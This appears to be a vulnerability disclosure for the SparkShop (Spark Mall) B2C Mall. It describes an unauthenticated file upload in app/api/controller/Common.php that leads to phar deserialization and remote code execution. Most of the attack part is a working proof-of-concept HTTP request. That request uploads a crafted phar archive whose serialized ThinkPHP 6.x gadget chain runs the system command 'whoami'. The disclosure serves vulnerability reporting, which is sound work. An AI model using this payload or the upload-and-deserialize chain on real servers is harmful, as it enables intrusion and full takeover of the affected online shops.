@@ -1,0 +1,50 @@
+A vulnerability categorized as critical has been discovered in the SparkShop (Spark Mall) B2C Mall. This vulnerability affects certain functions of the unauthorized interface file app/api/controller/Common.php. Manipulation of the file parameter results in arbitrary file uploads, which can be exploited by uploading a crafted phar file and using the changeImg method's improper handling during image conversion to achieve phar deserialization attacks. Combined with the command execution vulnerability in ThinkPHP 6.x, this can lead to remote code execution (RCE).
+
+![image.png](https://obtuchaung-1321169885.cos.ap-chengdu.myqcloud.com/E:%5Cnotebook%5C%E5%9B%BE%E7%89%8720241228022750.png)
+
+And here, only the blacklist is used to disable our file extensions, while bypassing content detection can be achieved by exceeding the corresponding file size.
+![image.png](https://obtuchaung-1321169885.cos.ap-chengdu.myqcloud.com/E:%5Cnotebook%5C%E5%9B%BE%E7%89%8720241228023022.png)
+
+ Finally, this can be used to trigger phar deserialization.
+![image.png](https://obtuchaung-1321169885.cos.ap-chengdu.myqcloud.com/E:%5Cnotebook%5C%E5%9B%BE%E7%89%8720241228023155.png)
+
+
+POC
+
+POST /api/Common/uploadFile HTTP/1.1
+Host: 127.0.0.1:5545
+Content-Length: 10429
+Cache-Control: max-age=0
+sec-ch-ua: 
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: ""
+Upgrade-Insecure-Requests: 1
+Origin: http://localhost:81
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycHA5Aruq3GnxCK5J
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://localhost:81/1.html
+Accept-Encoding: gzip, deflate
+Cookie: lg=cn; PbootSystem=8688mmruv3q3qn6v1gq9osllj9; PHPSESSID=c1846bd1b540b34473e5701a9a1b8721; QloApps-daf117f818c8eeecfa2bccccdd849a8c=def50200cb56e6bbbdbea9f81d16306448362b7272c853c207f95ac0a164b49023962fa1d8150a68b1a6c292687fdeeff6ff5662a4b57ed4847720e0c0c5044f54e35e21ee74e5f6c0cf8d52a9caf8362cc57425400d9a688e5249bcea88f003d77e078acb26e53b38fbe203750aec7c6945224d771aebb64af318b99f409f45d360d5207f17feb0756712b72d181fadfc2554a0e00afc6b3af20c1a8de933a2ca8cf7a9665eef5800d8217e87be3362004a793b45532c09ddabb379c8828a6f0797488276eb8f61f4c97436c4b3836da855285fb519fc86349a60a28e35c2deae93193693f6e4d5d1c647fbd1682465ed0addcd4c019eee5bb9cefe8f847da5bf280f1a8f6968b1712360fce4ac480f83107a32c257fe9439f6244c7ecd9e8a41beaec56f242aa013893bc3bb8d96a370d50a00dcea6222e98f69990e92a20d315dd9f6e6ef3f9f20bd52e232afbccc2795a40e05863286ab090840ebcb85b7d966168b65d3bebf221fae0e029094431c79530671a48450156b80f96c825c57e5ad32647f0463e49075a2799d0a367adcc504d695cf78916f14958774a8df4d7d89ebd580e4597422dbfe911865a147f555780e41446c5b546fa04de4d233fec4180b8db7f959c054897ebfbc3597ae6ee9b81b690f04af05484e295766adaa8c961e013a56cf; QloApps-982ef6ed83d922bf6ce9ada599a2fd13=def50200529286f1b6676584a4af3674213a52dfa5e1e579315bd10430cf70b75174e60b30164b447479ec5fd3b475cc6b0168eb270caf6e8303c33644bee4118dc51853dc9adbc1c31eceb180309e3d759f1d266a08718c1d7e56905c9ff8aabee160809028b4a7ee800f36881eeaf929d72c012690c049c28370acb34ea18c3915350bc3edb50c6fbd55cc6b295fa358bdef3ef44994fe8712d0c4d3c72456db6681762c1fd5c9eca41633d2d6a072fdbcc6064c3c0b0317f2d0c439896d6b1409541ae78d9b9e271c313cbf4fb15d4fe4143100baeb89805aa8c8a35370675dfd764f55876aa16e4f84376f9fb8362ad1304e57ea75942a0ff642d0b6bc4db699b819fd3adbf8e43ab6846365ab6d272de435d5f7f4071a0e7027da4e31e28c3af8f6a51156e07f60a847a3707be9abd2; sparkShop=eaeb829d260543a3eb533231a651ab42
+Connection: close
+
+------WebKitFormBoundarycHA5Aruq3GnxCK5J
+Content-Disposition: form-data; name="file"; filename="phar.tar"
+Content-Type: application/x-tar
+
+.phar/0000777000175000017500000000000014733517173007675 5ustar  lhlh.phar/.metadata0000777000175000017500000000075514733517163011467 0ustar  lhlhO:17:"think\model\Pivot":7:{s:21:"think\ModellazySave";b:1;s:19:"think\Modelexists";b:1;s:8:"*table";O:15:"think\route\Url":4:{s:8:"*route";O:14:"think\Validate":2:{s:7:"*type";a:1:{s:13:"getDomainBind";s:6:"system";}s:7:"*rule";a:0:{}}s:6:"*url";s:0:"";s:6:"*app";O:9:"think\App":1:{s:7:"request";s:4:"1111";}s:9:"*domain";s:6:"whoami";}s:17:"think\Modeldata";a:1:{s:6:"system";s:6:"system";}s:19:"think\Modelorigin";a:0:{}s:8:"*field";a:0:{}s:11:"*readonly";a:0:{}}
+------WebKitFormBoundarycHA5Aruq3GnxCK5J--
+
+
+![image.png](https://obtuchaung-1321169885.cos.ap-chengdu.myqcloud.com/E:%5Cnotebook%5C%E5%9B%BE%E7%89%8720241228024132.png)
+
+
+
+![image.png](https://obtuchaung-1321169885.cos.ap-chengdu.myqcloud.com/E:%5Cnotebook%5C%E5%9B%BE%E7%89%8720241228024153.png)
+
+
+We can achieve RCE (Remote Code Execution) through PHAR deserialization.
